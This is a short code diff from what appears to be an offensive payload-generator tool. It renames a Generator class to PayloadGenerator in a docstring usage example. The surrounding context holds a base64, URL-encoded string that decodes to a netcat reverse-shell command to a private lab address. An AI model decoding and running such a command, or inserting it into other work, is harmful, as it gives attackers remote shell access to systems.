@@ -14,8 +14,8 @@ bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNTYuMjAgODA4MA%3D%3D
 
 ```
 """
-from .payload_generator import Generator
+from .payload_generator import PayloadGenerator
 
-generator = Generator()
+generator = PayloadGenerator()
 payload = generator.generate_payload(cli=None)
 print(payload)
